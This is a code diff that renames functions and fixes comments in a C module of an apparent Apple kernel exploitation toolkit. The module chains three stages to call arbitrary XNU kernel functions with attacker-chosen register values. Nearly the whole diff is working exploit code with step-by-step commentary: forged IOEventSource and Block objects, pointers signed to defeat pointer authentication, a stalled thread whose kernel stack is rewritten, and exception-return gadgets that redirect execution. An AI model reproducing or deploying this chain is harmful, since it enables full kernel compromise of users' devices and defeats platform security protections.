@@ -37,13 +37,13 @@
 /// This module provides functionality for calling aribitary kernel functions with controlled values in
 /// registers x0 - x30, sp and q0 - q31. To achieve this, the implementation uses a three link chain
 ///
-/// Link 0 :- This link create fake small block descriptors with dispose helper function pointing
+/// Link 0: This link create fake small block descriptors with dispose helper function pointing
 /// to the entry point of link 1. Then it uses the functionality provided by `util/pacda.c` to sign
 /// and assign the fake small block descriptor as the `block_descriptor` of a Block. This block
 /// is assigned to `IOEventSource::actionBlock` and the `IOEventSource` is assigned as a value
 /// to the `props` dictionary is `IOSurface`. When the `IOSurfaceRemoveAllValues` method is
 /// called, the `IOEventSource::free` will be triggered, which will call `Block_release` to release
-/// the `IOEventSource::actionBlock`, which would call the dispose helper of the associated
+/// the `IOEventSource::actionBlock`. `Block_release` will call the dispose helper of the associated
 /// block descriptor, leading to program control getting directed to entry of Link 1. The technique
 /// used in `util/pacda.c` to get arbitary values in callee-saved registers is used in link 1 also to
 /// set the values of registers x20 and x21 before the `Block_release` function is triggered.
@@ -101,7 +101,7 @@ enum {
 // MARK: - Link 0
 ///
 /// Block objects may have copy and dispose helper functions synthesized by the compiler.
-/// These helper functions are used in `_Block_copy` and `_Block_release` methods and they
+/// These helper functions are used in `Block_copy` and `Block_release` methods and they
 /// help copying / releasing a Block when they are copied to or released from the heap.
 ///
 /// struct Block_layout {
@@ -205,7 +205,7 @@ enum {
 ///         (void *)((uintptr_t)(intptr_t)(field) + (uintptr_t)&(field)), \
 ///         ptrauth_key_function_pointer, 0))
 ///
-/// The `Block_release` method will call the function pointed by this signed pointer with first
+/// The `Block_release` method will then call the function pointed by this signed pointer with first
 /// argument (x0) equal to address of `struct Block_layout`
 ///
 /// To prevent an attacker from modifying the `copy` or `dispose` field of the descriptor of a
@@ -229,7 +229,7 @@ enum {
 /// `event_source->actionBlock` pointing to the fake block. Then we will create a new `IOSurface`
 /// using `IOSurfaceCreate` method and we will add the fake event source as a value to a key in
 /// the `props` dictionary (Dictionary which stores the key value pairs set using `IOSurfaceSetValue`
-/// method) of the `IOSurface`. Then we will  call `IOSurfaceRemoveValue` method to remove
+/// method) of the `IOSurface`. Then we will call `IOSurfaceRemoveValue` method to remove
 /// the fake event source, which will trigger the `Block_release` function. The `Block_release`
 /// function will trigger the dispose helper of the fake block leading to arbitary kernel function
 /// execution.
@@ -241,8 +241,8 @@ enum {
 /// `IOStatistics::unregisterEventSource` from being called when the event source is released.
 /// This method acquires exclusive lock on read write lock `iostatistics->lock`. By acquring this
 /// lock before releasing the event source, we can make the program execution get paused
-/// waiting for this lock to release and we can modify kernel stack such that values of `x20` and
-/// `x21` can be controlled once the `IOStastics::unregisterEventSource` method returns.
+/// waiting for this lock to released and we can modify kernel stack such that values of `x20` and
+/// `x21` can be controlled once the `IOStatistics::unregisterEventSource` method returns.
 /// Since the `Block_release` method is called immediatly after this method and since `Block_release`
 /// method does not use `x20` and `x21` registers, the dispose helper pointing to Link 1 will
 /// be called with controlled `x20` and `x21` values.
@@ -257,12 +257,12 @@ typedef struct link0 {
     uintptr_t block;
     uintptr_t block_descriptor;
     
-    xpl_util_zalloc_t io_event_source_allocator;
-    xpl_util_zalloc_t block_allocator;
-    xpl_util_zalloc_t reserved_allocator;
-    xpl_util_zalloc_t counter_allocator;
+    xpl_zalloc_t io_event_source_allocator;
+    xpl_zalloc_t block_allocator;
+    xpl_zalloc_t reserved_allocator;
+    xpl_zalloc_t counter_allocator;
     
-    xpl_util_lck_rw_t     iostatistics_lock;
+    xpl_lck_rw_t     iostatistics_lock;
     IOSurfaceRef         iosurface;
     uintptr_t            lr_stack_ptr;
     dispatch_semaphore_t sem_iosurface_done;
@@ -274,40 +274,40 @@ typedef struct link0 {
 }* link0_t;
 
 
-void xpl_util_kfunc_link0_create_fake_block(link0_t link0) {
+void xpl_kfunc_link0_create_fake_block(link0_t link0) {
     xpl_assert_cond(link0->block_allocator, !=, NULL);
-    uintptr_t block = xpl_util_zalloc_alloc(link0->block_allocator, 0);
-    uintptr_t descriptor = xpl_util_pacda_sign_with_descriminator(link0->free_zone, block + TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_DESCRIMINATOR);
+    uintptr_t block = xpl_zalloc_alloc(link0->block_allocator, 0);
+    uintptr_t descriptor = xpl_pacda_sign_with_descriminator(link0->free_zone, block + TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_OFFSET, TYPE_BLOCK_LAYOUT_MEM_DESCRIPTOR_DESCRIMINATOR);
     
     link0->block = block;
     link0->block_descriptor = descriptor;
 }
 
 
-void xpl_util_kfunc_link0_reset_fake_block(link0_t link0) {
-    uintptr_t block = xpl_util_zalloc_alloc(link0->block_allocator, 0);
+void xpl_kfunc_link0_reset_fake_block(link0_t link0) {
+    uintptr_t block = xpl_zalloc_alloc(link0->block_allocator, 0);
     xpl_assert_cond(block, ==, link0->block);
 }
 
 
-void xpl_util_kfunc_link0_create_fake_io_event_source(link0_t link0) {
+void xpl_kfunc_link0_create_fake_io_event_source(link0_t link0) {
     xpl_assert_cond(link0->io_event_source_allocator, !=, NULL);
     
-    uintptr_t event_source = xpl_util_zalloc_alloc(link0->io_event_source_allocator, 0);
-    uintptr_t vtable = xpl_util_pacda_sign_with_descriminator( xpl_slider_kernel_slide(VAR_IO_EVENT_SOURCE_VTABLE + 0x10), event_source, TYPE_IO_EVENT_SOURCE_MEM_VTABLE_DESCRIMINATOR);
+    uintptr_t event_source = xpl_zalloc_alloc(link0->io_event_source_allocator, 0);
+    uintptr_t vtable = xpl_pacda_sign_with_descriminator( xpl_slider_kernel_slide(VAR_IO_EVENT_SOURCE_VTABLE + 0x10), event_source, TYPE_IO_EVENT_SOURCE_MEM_VTABLE_DESCRIMINATOR);
     
     link0->io_event_source = event_source;
     link0->io_event_source_vtable = vtable;
 }
 
 
-void xpl_util_kfunc_link0_reset_fake_io_event_source(link0_t link0) {
-    uintptr_t event_source = xpl_util_zalloc_alloc(link0->io_event_source_allocator, 0);
+void xpl_kfunc_link0_reset_fake_io_event_source(link0_t link0) {
+    uintptr_t event_source = xpl_zalloc_alloc(link0->io_event_source_allocator, 0);
     xpl_assert_cond(event_source, ==, link0->io_event_source);
 }
 
 
-void xpl_util_kfunc_link0_init(link0_t link0, int free_zone_index) {
+void xpl_kfunc_link0_init(link0_t link0, int free_zone_index) {
     /// The small block descriptor stores the relative offset to the dispose function
     /// as a signed 32 bit integer. This allows us to call only functions within 2GB
     /// range from the address of `dispose` field in the small block descriptor.
@@ -318,20 +318,20 @@ void xpl_util_kfunc_link0_init(link0_t link0, int free_zone_index) {
     /// The length of zone_array is 650 and each element in the zone array is of
     /// size 168 bytes. This zone_array have unused elements in them and we use
     /// one of these unused slots to store the fake small block descriptor
-    uintptr_t free_zone = xpl_util_zalloc_find_zone_at_index(free_zone_index);
+    uintptr_t free_zone = xpl_zalloc_find_zone_at_index(free_zone_index);
     xpl_assert_cond(xpl_kmem_read_uint64(free_zone, 0), ==, 0);
     
-    /// Used for allocating memory for fake IOEventSource
-    xpl_util_zalloc_t io_event_source_allocator = xpl_util_zalloc_create(xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_IO_EVENT_SOURCE_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
+    /// Used for allocating memory for fake `IOEventSource`
+    xpl_zalloc_t io_event_source_allocator = xpl_zalloc_create(xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_IO_EVENT_SOURCE_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
     
     /// Used for allocating memory for fake `IOEventSource::reserved` field
-    xpl_util_zalloc_t reserved_allocator = xpl_util_zalloc_create(xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_IO_EVENT_SOURCE_RESERVED_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
+    xpl_zalloc_t reserved_allocator = xpl_zalloc_create(xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_IO_EVENT_SOURCE_RESERVED_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
     
     /// Used for allocating memory for fake `IOEventSourceCounter`
-    xpl_util_zalloc_t counter_allocator = xpl_util_zalloc_create(xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_IO_EVENT_SOURCE_COUNTER_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
+    xpl_zalloc_t counter_allocator = xpl_zalloc_create(xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_IO_EVENT_SOURCE_COUNTER_KTV), TYPE_KALLOC_TYPE_VIEW_MEM_KT_ZV_OFFSET), 1);
     
     /// Used for allocating memory for fake Block
-    xpl_util_zalloc_t block_allocator = xpl_util_zalloc_create(xpl_util_kh_find_zone_for_size(xpl_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), FAKE_BLOCK_SIZE), 1);
+    xpl_zalloc_t block_allocator = xpl_zalloc_create(xpl_kheap_find_zone_for_size(xpl_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), FAKE_BLOCK_SIZE), 1);
     
     bzero(link0, sizeof(*link0));
     link0->state = LINK_STATE_CREATED;
@@ -340,17 +340,17 @@ void xpl_util_kfunc_link0_init(link0_t link0, int free_zone_index) {
     link0->reserved_allocator = reserved_allocator;
     link0->counter_allocator = counter_allocator;
     link0->block_allocator = block_allocator;
-    xpl_util_kfunc_link0_create_fake_io_event_source(link0);
-    xpl_util_kfunc_link0_create_fake_block(link0);
+    xpl_kfunc_link0_create_fake_io_event_source(link0);
+    xpl_kfunc_link0_create_fake_block(link0);
 }
 
 
-void xpl_util_kfunc_link0_prepare_fake_event_source(link0_t link0) {
+void xpl_kfunc_link0_prepare_fake_event_source(link0_t link0) {
     uintptr_t event_source = link0->io_event_source;
     xpl_kmem_write_uint64(event_source, TYPE_OS_OBJECT_MEM_VTABLE_OFFSET, link0->io_event_source_vtable);
     
     /// Set the reference count to 1 so that the event source will be released when
-    /// it is remove the `IOSurface` props dictionary
+    /// it is removed from the `IOSurface` props dictionary
     uint32_t ref_count = 1 | (1ULL << 16);
     xpl_kmem_write_uint32(event_source, TYPE_OS_OBJECT_MEM_RETAIN_COUNT_OFFSET, ref_count);
     
@@ -360,16 +360,15 @@ void xpl_util_kfunc_link0_prepare_fake_event_source(link0_t link0) {
     /// for `IOEventSource::free` method to call `Block_release` function
     xpl_kmem_write_uint32(event_source, TYPE_IO_EVENT_SOURCE_MEM_FLAGS_OFFSET, 0x4);
     
-    
     /// Required for triggering `IOStatistics::unregisterEventSource` method
-    uintptr_t reserved = xpl_util_zalloc_alloc(link0->reserved_allocator, 0);
+    uintptr_t reserved = xpl_zalloc_alloc(link0->reserved_allocator, 0);
     xpl_kmem_write_uint64(event_source, TYPE_IO_EVENT_SOURCE_MEM_RESERVED_OFFSET, reserved);
-    uintptr_t counter = xpl_util_zalloc_alloc(link0->counter_allocator, 0);
+    uintptr_t counter = xpl_zalloc_alloc(link0->counter_allocator, 0);
     xpl_kmem_write_uint64(reserved, 0, counter);
 }
 
 
-void xpl_util_kfunc_link0_prepare_fake_block_descriptor(link0_t link0, uintptr_t target_func) {
+void xpl_kfunc_link0_prepare_fake_block_descriptor(link0_t link0, uintptr_t target_func) {
     /// Calculate relative offset of target func from address of `desc->dispose` field
     int64_t diff = (target_func - xpl_ptrauth_strip(link0->block_descriptor) - TYPE_BLOCK_DESCRIPTOR_SMALL_MEM_DISPOSE_OFFSET);
     xpl_assert(diff >= INT32_MIN && diff <= INT32_MAX);
@@ -377,7 +376,7 @@ void xpl_util_kfunc_link0_prepare_fake_block_descriptor(link0_t link0, uintptr_t
 }
 
 
-void xpl_util_kfunc_link0_prepare_fake_block(link0_t link0, const struct arm_context* block_data) {
+void xpl_kfunc_link0_prepare_fake_block(link0_t link0, const struct arm_context* block_data) {
     /// Make sure these flags are set on the block data. These flags are required for
     /// triggering the dispose helper when the block is released
     const uint32_t required_flags = BLOCK_SMALL_DESCRIPTOR | BLOCK_NEEDS_FREE | BLOCK_HAS_COPY_DISPOSE;
@@ -400,30 +399,30 @@ void xpl_util_kfunc_link0_prepare_fake_block(link0_t link0, const struct arm_con
 }
 
 
-uintptr_t xpl_util_kfunc_get_lr_unregister_event_source(void) {
+uintptr_t xpl_kfunc_get_lr_unregister_event_source(void) {
     /// Get the link register value for branch with link call to `IOStatistics::unregisterEventSource`
     /// from method `IOEventSource::free`
     uintptr_t lr_unregister_event_source = xpl_slider_kernel_slide(FUNC_IO_EVENT_SOURCE_FREE_ADDR) + LR_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_OFFSET;
     
     /// Verify we got the right link register value
-    xpl_assert_cond(xpl_kmem_read_uint32(lr_unregister_event_source - 4, 0), ==, xpl_util_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_ADDR), lr_unregister_event_source - 4));
+    xpl_assert_cond(xpl_kmem_read_uint32(lr_unregister_event_source - 4, 0), ==, xpl_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_IO_STATISTICS_UNREGISTER_EVENT_SOURCE_ADDR), lr_unregister_event_source - 4));
     
     return lr_unregister_event_source;
 }
 
 
-uintptr_t xpl_util_kfunc_get_lr_is_io_connect_method(void) {
+uintptr_t xpl_kfunc_get_lr_is_io_connect_method(void) {
     /// Get the link register value for branch with link call to `is_io_connect_method` from
     /// method `_Xio_connect_method`
     uintptr_t lr_is_io_connect_method = xpl_slider_kernel_slide(FUNC_XIO_CONNECT_METHOD_ADDR) + LR_IS_IO_CONNECT_METHOD_OFFSET;
     
-    xpl_assert_cond(xpl_kmem_read_uint32(lr_is_io_connect_method - 4, 0), ==, xpl_util_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_IS_IO_CONNECT_METHOD_ADDR), lr_is_io_connect_method - 4));
+    xpl_assert_cond(xpl_kmem_read_uint32(lr_is_io_connect_method - 4, 0), ==, xpl_asm_build_bl_instr(xpl_slider_kernel_slide(FUNC_IS_IO_CONNECT_METHOD_ADDR), lr_is_io_connect_method - 4));
     
     return lr_is_io_connect_method;
 }
 
 
-uintptr_t xpl_util_kfunc_get_lr_block_dispose_helper(void) {
+uintptr_t xpl_kfunc_get_lr_block_dispose_helper(void) {
     /// Get the link register value for branch with link call to dispose helper from
     /// `Block_release` method
     uintptr_t lr_block_dispose_helper = xpl_slider_kernel_slide(FUNC_BLOCK_RELEASE_ADDR) + LR_BLOCK_RELEASE_DISPOSE_HELPER_OFFSET;
@@ -437,7 +436,7 @@ uintptr_t xpl_util_kfunc_get_lr_block_dispose_helper(void) {
 }
 
 
-void xpl_util_kfunc_link0_ensure_iostatstics_lock(void) {
+void xpl_kfunc_link0_ensure_iostatstics_lock(void) {
     /// The `IOStatistics` is only enabled when `kIOStatistics` flag is set on `gIOKitDebug`
     /// global variable. If `IOStatistics` is not enabled, the `iostatistics->lock` would be null.
     /// We will setup a fake lock if it is NULL. This lock is required to get control over
@@ -454,29 +453,29 @@ void xpl_util_kfunc_link0_ensure_iostatstics_lock(void) {
 }
 
 
-struct xpl_util_kfunc_register_state xpl_util_kfunc_link0_pre_execute(link0_t link0) {
+struct xpl_kfunc_register_state xpl_kfunc_link0_pre_execute(link0_t link0) {
     xpl_assert_cond(link0->state, ==, LINK_STATE_CREATED);
-    uintptr_t lr_unregister_event_source = xpl_util_kfunc_get_lr_unregister_event_source();
-    uintptr_t lr_is_io_connect_method = xpl_util_kfunc_get_lr_is_io_connect_method();
-    uintptr_t lr_block_dispose_helper = xpl_util_kfunc_get_lr_block_dispose_helper();
+    uintptr_t lr_unregister_event_source = xpl_kfunc_get_lr_unregister_event_source();
+    uintptr_t lr_is_io_connect_method = xpl_kfunc_get_lr_is_io_connect_method();
+    uintptr_t lr_block_dispose_helper = xpl_kfunc_get_lr_block_dispose_helper();
     
-    xpl_util_kfunc_link0_prepare_fake_event_source(link0);
+    xpl_kfunc_link0_prepare_fake_event_source(link0);
     
     uintptr_t surface;
     IOSurfaceRef surface_ref = xpl_io_surface_create(&surface);
-    IOSurfaceSetValue(surface_ref, CFSTR("xpl_util_kfunc_key"), kCFBooleanTrue);
+    IOSurfaceSetValue(surface_ref, CFSTR("xpl_kfunc_key"), kCFBooleanTrue);
     
-    /// Change the value associated with key "xpl_util_kfunc_key" to created
+    /// Change the value associated with key "xpl_kfunc_key" to created
     /// fake `IOEventSource`
     uintptr_t props = xpl_kmem_read_uint64(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET);
-    int error = xpl_os_dictionary_set_value_of_key(props, "xpl_util_kfunc_key", link0->io_event_source);
+    int error = xpl_os_dictionary_set_value_of_key(props, "xpl_kfunc_key", link0->io_event_source);
     xpl_assert_err(error);
     
     /// Make sure `IOStatistics::lock` is not NULL
-    xpl_util_kfunc_link0_ensure_iostatstics_lock();
+    xpl_kfunc_link0_ensure_iostatstics_lock();
     
     /// Acquire exclusive lock on read write lock `IOStatistics::lock`
-    xpl_util_lck_rw_t iostatistics_lock = xpl_util_lck_rw_lock_exclusive( xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0));
+    xpl_lck_rw_t iostatistics_lock = xpl_lck_rw_lock_exclusive( xpl_kmem_read_uint64(xpl_slider_kernel_slide(VAR_G_IO_STATISTICS_LOCK), 0));
     
     /// Trigger `IOEventSource::free` method of the fake event source in a separate
     /// background thread. This thread will be blocked until `IOStatistics::lock` is released
@@ -487,7 +486,7 @@ struct xpl_util_kfunc_register_state xpl_util_kfunc_link0_pre_execute(link0_t li
         *waiting_thread = xpl_xnu_thread_current_thread();
         dispatch_semaphore_signal(sem_surface_destroying);
         xpl_log_debug("io_surface remove value start");
-        IOSurfaceRemoveValue(surface_ref, CFSTR("xpl_util_kfunc_key"));
+        IOSurfaceRemoveValue(surface_ref, CFSTR("xpl_kfunc_key"));
         xpl_log_debug("io_surface remove value done");
         dispatch_semaphore_signal(sem_surface_destroyed);
     });
@@ -497,22 +496,21 @@ struct xpl_util_kfunc_register_state xpl_util_kfunc_link0_pre_execute(link0_t li
     
     /// Wait until `IOStatistics::unregisterEventSource` method tries to acquire `IOStatistics::lock`
     /// by calling `IORWLockWrite` method
-    error = xpl_util_lck_rw_wait_for_contention(iostatistics_lock, *waiting_thread, NULL);
+    error = xpl_lck_rw_wait_for_contention(iostatistics_lock, *waiting_thread, NULL);
     xpl_assert_err(error);
     
-    struct xpl_util_kfunc_register_state register_state;
+    struct xpl_kfunc_register_state register_state;
     bzero(&register_state, sizeof(register_state));
     
     uintptr_t lr;
     /// Find the location of stack used by `IOStatistics::unregisterEventSource` method
-    error = xpl_xnu_thread_scan_stack(*waiting_thread, lr_unregister_event_source, xpl_PTRAUTH_MASK, 1024, &lr);
+    error = xpl_xnu_thread_scan_stack(*waiting_thread, lr_unregister_event_source, XPL_PTRAUTH_MASK, 1024, &lr);
     xpl_assert_err(error);
     
     link0->lr_stack_ptr = lr;
     
-    /// Save the values of required callee-saved registers. These registers
-    /// must be restored to this values before the dispose function transfers
-    /// control back to `Block_release`
+    /// Save the values of required callee-saved registers. These registers must be restored to
+    /// this values before the dispose function transfers control back to `Block_release`
     register_state.x19 = link0->block;
     register_state.x20 = xpl_kmem_read_uint64(lr, -0x18);
     register_state.x21 = xpl_kmem_read_uint64(lr, -0x20);
@@ -523,7 +521,7 @@ struct xpl_util_kfunc_register_state xpl_util_kfunc_link0_pre_execute(link0_t li
     register_state.fp = register_state.sp + 0x10;
     register_state.lr = lr_block_dispose_helper;
     
-    error = xpl_xnu_thread_scan_stack(*waiting_thread, lr_is_io_connect_method, xpl_PTRAUTH_MASK, 1024, &lr);
+    error = xpl_xnu_thread_scan_stack(*waiting_thread, lr_is_io_connect_method, XPL_PTRAUTH_MASK, 1024, &lr);
     xpl_assert_err(error);
     
     register_state.x25 = xpl_kmem_read_uint64(lr, -0x40);
@@ -539,12 +537,12 @@ struct xpl_util_kfunc_register_state xpl_util_kfunc_link0_pre_execute(link0_t li
 }
 
 
-void xpl_util_kfunc_link0_execute(link0_t link0, uintptr_t target_func, uint64_t x20, uint64_t x21, const struct arm_context* block_data) {
+void xpl_kfunc_link0_execute(link0_t link0, uintptr_t target_func, uint64_t x20, uint64_t x21, const struct arm_context* block_data) {
     xpl_assert_cond(link0->state, ==, LINK_STATE_PREPARED);
-    xpl_util_kfunc_link0_prepare_fake_block(link0, block_data);
+    xpl_kfunc_link0_prepare_fake_block(link0, block_data);
     
     /// Store the relative target function address to `desc->dispose` member
-    xpl_util_kfunc_link0_prepare_fake_block_descriptor(link0, target_func);
+    xpl_kfunc_link0_prepare_fake_block_descriptor(link0, target_func);
     
     /// Modify the stack used by `IOStatistics::unregisterEventSource` method
     /// to get desired values in `x20` and `x21` registers once the method returns
@@ -552,25 +550,25 @@ void xpl_util_kfunc_link0_execute(link0_t link0, uintptr_t target_func, uint64_t
     xpl_kmem_write_uint64(link0->lr_stack_ptr, -0x20, x21);
     
     /// Release the exclusive lock acquired on `IOStatistics::lock`
-    xpl_util_lck_rw_lock_done(&link0->iostatistics_lock);
+    xpl_lck_rw_lock_done(&link0->iostatistics_lock);
     dispatch_semaphore_wait(link0->sem_iosurface_done, DISPATCH_TIME_FOREVER);
     dispatch_release(link0->sem_iosurface_done);
     link0->sem_iosurface_done = NULL;
     IOSurfaceDecrementUseCount(link0->iosurface);
     link0->iosurface = NULL;
     
-    xpl_util_kfunc_link0_reset_fake_io_event_source(link0);
-    xpl_util_kfunc_link0_reset_fake_block(link0);
+    xpl_kfunc_link0_reset_fake_io_event_source(link0);
+    xpl_kfunc_link0_reset_fake_block(link0);
     link0->state = LINK_STATE_CREATED;
 }
 
 
-void xpl_util_kfunc_link0_destroy(link0_t link0) {
+void xpl_kfunc_link0_destroy(link0_t link0) {
     xpl_assert_cond(link0->state, ==, LINK_STATE_CREATED);
-    xpl_util_zalloc_destroy(&link0->io_event_source_allocator);
-    xpl_util_zalloc_destroy(&link0->block_allocator);
-    xpl_util_zalloc_destroy(&link0->counter_allocator);
-    xpl_util_zalloc_destroy(&link0->reserved_allocator);
+    xpl_zalloc_destroy(&link0->io_event_source_allocator);
+    xpl_zalloc_destroy(&link0->block_allocator);
+    xpl_zalloc_destroy(&link0->counter_allocator);
+    xpl_zalloc_destroy(&link0->reserved_allocator);
 }
 
 
@@ -579,8 +577,9 @@ void xpl_util_kfunc_link0_destroy(link0_t link0) {
 /// pointed by x0 is only partially controlled because it is shared by `struct Block_layout` and
 /// `struct arm_context`
 ///
-/// The memory pointed by x0 is saved with `struct arm_context` to set value of
-/// x4 = target function address and x0 = address of `struct arm_context` with fully controlled data
+/// The memory pointed by x0 is saved with `struct arm_context` which is used to load values of
+/// registers x4 to target function address and x0 to address of `struct arm_context` to be used by
+/// Link 2
 ///
 ///
 //  kernel.release.t6000(21E230)`exception_return_unint_tpidr_x3_dont_trash_x18:
@@ -617,8 +616,8 @@ void xpl_util_kfunc_link0_destroy(link0_t link0) {
 /// // ***NOTE***: Restores PSTATE from SPSR_EL1 and branches to ELR_EL1
 //  0xfffffe0007253d58      eret
 ///
-/// This link will call Link 2 with value in value in register x4 set to target kernel function to be
-/// called, and  value in x0 pointing to a fully controlled location in kernel memory
+/// This link will call Link 2 with value  in register x4 set to target kernel function to be
+/// called, and value in x0 pointing to a fully controlled location in kernel memory
 ///
 
 
@@ -628,7 +627,7 @@ typedef struct link1 {
 }* link1_t;
 
 
-void xpl_util_kfunc_link1_init(link1_t link1) {
+void xpl_kfunc_link1_init(link1_t link1) {
     static_assert(offsetof(struct arm_context, ss.uss.x[0]) == TYPE_BLOCK_LAYOUT_MEM_FLAGS_OFFSET, "");
     
     /// As noted in the discussion above, when Link 1 is executed the data in memory pointed
@@ -689,7 +688,7 @@ struct link1_requirements {
 /// Return the values of registers `x20`, `x21` and `pc` with which Link 1 must be called
 /// Before calling the Link 1, the data in memory pointed by `x0` must also be updated to
 /// the returned `x0_data` value
-struct link1_requirements xpl_util_kfunc_link1_prepare(link1_t link1, uintptr_t target_func, const struct arm_context* x0_data, uint64_t x4, uint64_t sp, uintptr_t block_descriptor) {
+struct link1_requirements xpl_kfunc_link1_prepare(link1_t link1, uintptr_t target_func, const struct arm_context* x0_data, uint64_t x4, uint64_t sp, uintptr_t block_descriptor) {
     struct link1_requirements req;
     bzero(&req, sizeof(req));
     
@@ -727,7 +726,7 @@ struct link1_requirements xpl_util_kfunc_link1_prepare(link1_t link1, uintptr_t 
     return req;
 }
 
-void xpl_util_kfunc_link1_destroy(link1_t link1) {
+void xpl_kfunc_link1_destroy(link1_t link1) {
     xpl_allocator_large_mem_free(&link1->x0_data_allocator);
 }
 
@@ -781,7 +780,7 @@ void xpl_util_kfunc_link1_destroy(link1_t link1) {
 /// // ***NOTE***:  Branches to address in ELR_EL1 (Loaded from x4). SPSR_EL1 reused from link 1
 //  0xfffffe000725f120      eret
 ///
-/// This will call the arbitary kernel function to be executed with controlled values in registers
+/// This link will call the arbitary kernel function to be executed with controlled values in registers
 /// x0 - x30 and q0 - q31
 ///
 
@@ -790,7 +789,7 @@ typedef struct link2 {
 }* link2_t;
 
 
-void xpl_util_kfunc_link2_init(link2_t link2) {
+void xpl_kfunc_link2_init(link2_t link2) {
     /// Empty
 }
 
@@ -801,9 +800,9 @@ struct link2_requirements {
     uint64_t pc;
 };
 
-/// Returns the values of registers `x4` and `pc` that must be set before Link  2 is called. The
+/// Returns the values of registers `x4` and `pc` that must be set before Link 2 is called. The
 /// memory pointed by `x0` must also be updated to `x0_data` before calling Link 2
-struct link2_requirements xpl_util_kfunc_link2_prepare(link2_t link2, uintptr_t target_func, const uint64_t x[29], uint64_t fp, uint64_t lr, const uint128_t q[32]) {
+struct link2_requirements xpl_kfunc_link2_prepare(link2_t link2, uintptr_t target_func, const uint64_t x[29], uint64_t fp, uint64_t lr, const uint128_t q[32]) {
     struct link2_requirements req;
     bzero(&req, sizeof(req));
     
@@ -825,14 +824,14 @@ struct link2_requirements xpl_util_kfunc_link2_prepare(link2_t link2, uintptr_t 
     return req;
 }
 
-void xpl_util_kfunc_link2_destroy(link2_t link2) {
+void xpl_kfunc_link2_destroy(link2_t link2) {
     /// Empty
 }
 
 
 // MARK: - Chain
 
-struct xpl_util_kfunc {
+struct xpl_kfunc {
     struct link0 link0;
     struct link1 link1;
     struct link2 link2;
@@ -844,42 +843,42 @@ struct xpl_util_kfunc {
 };
 
 
-xpl_util_kfunc_t xpl_util_kfunc_create(uint free_zone_idx) {
-    xpl_util_kfunc_t util = malloc(sizeof(struct xpl_util_kfunc));
+xpl_kfunc_t xpl_kfunc_create(uint free_zone_idx) {
+    xpl_kfunc_t util = malloc(sizeof(struct xpl_kfunc));
     util->state = CHAIN_STATE_CREATED;
-    xpl_util_kfunc_link0_init(&util->link0, free_zone_idx);
-    xpl_util_kfunc_link1_init(&util->link1);
-    xpl_util_kfunc_link2_init(&util->link2);
+    xpl_kfunc_link0_init(&util->link0, free_zone_idx);
+    xpl_kfunc_link1_init(&util->link1);
+    xpl_kfunc_link2_init(&util->link2);
     return util;
 }
 
 
-struct xpl_util_kfunc_register_state xpl_util_kfunc_pre_execute(xpl_util_kfunc_t util) {
+struct xpl_kfunc_register_state xpl_kfunc_pre_execute(xpl_kfunc_t util) {
     xpl_assert_cond(util->state, ==, CHAIN_STATE_CREATED);
     
-    struct xpl_util_kfunc_register_state register_state = xpl_util_kfunc_link0_pre_execute(&util->link0);
+    struct xpl_kfunc_register_state register_state = xpl_kfunc_link0_pre_execute(&util->link0);
     
     util->state = CHAIN_STATE_PREPARED;
     return register_state;
 }
 
 
-void xpl_util_kfunc_execute(xpl_util_kfunc_t util, uintptr_t target_func, const struct xpl_util_kfunc_args* args) {
+void xpl_kfunc_execute(xpl_kfunc_t util, uintptr_t target_func, const struct xpl_kfunc_args* args) {
     xpl_assert_cond(util->state, ==, CHAIN_STATE_PREPARED);
     
-    struct link2_requirements link2_req = xpl_util_kfunc_link2_prepare(&util->link2, target_func, args->x, args->fp, args->lr, args->q);
+    struct link2_requirements link2_req = xpl_kfunc_link2_prepare(&util->link2, target_func, args->x, args->fp, args->lr, args->q);
     
-    struct link1_requirements link1_req = xpl_util_kfunc_link1_prepare(&util->link1, link2_req.pc, &link2_req.x0_data, link2_req.x4, args->sp, util->link0.block_descriptor);
+    struct link1_requirements link1_req = xpl_kfunc_link1_prepare(&util->link1, link2_req.pc, &link2_req.x0_data, link2_req.x4, args->sp, util->link0.block_descriptor);
     
-    xpl_util_kfunc_link0_execute(&util->link0, link1_req.pc, link1_req.x20, link1_req.x21, &link1_req.x0_data);
+    xpl_kfunc_link0_execute(&util->link0, link1_req.pc, link1_req.x20, link1_req.x21, &link1_req.x0_data);
     
     util->state = CHAIN_STATE_CREATED;
 }
 
 
-void xpl_util_kfunc_execute_simple(xpl_util_kfunc_t util, uintptr_t target_func, uint64_t args[8]) {
-    struct xpl_util_kfunc_register_state register_state = xpl_util_kfunc_pre_execute(util);
-    struct xpl_util_kfunc_args kfunc_args;
+void xpl_kfunc_execute_simple(xpl_kfunc_t util, uintptr_t target_func, uint64_t args[8]) {
+    struct xpl_kfunc_register_state register_state = xpl_kfunc_pre_execute(util);
+    struct xpl_kfunc_args kfunc_args;
     bzero(&kfunc_args, sizeof(kfunc_args));
     /// Set arguments to the target function
     kfunc_args.x[0] = args[0];
@@ -902,15 +901,15 @@ void xpl_util_kfunc_execute_simple(xpl_util_kfunc_t util, uintptr_t target_func,
     kfunc_args.fp = register_state.fp;
